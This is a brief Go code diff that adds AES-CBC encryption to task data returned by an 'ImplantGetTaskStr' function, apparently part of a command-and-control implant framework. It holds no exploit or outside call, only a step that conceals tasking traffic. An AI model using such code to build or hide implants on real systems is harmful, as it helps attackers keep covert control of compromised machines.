@@ -146,5 +146,6 @@ func (i *Implant) ImplantGetTaskStr() (string, [8]byte, error) {
 
 	t.Sent = true
 	tb := t.TaskMarshal()
-	return TaskEncode(tb), t.ID, nil
+	tbe := i.enc.AESCbcEncrypt(tb)
+	return TaskEncode(tbe), t.ID, nil
 }
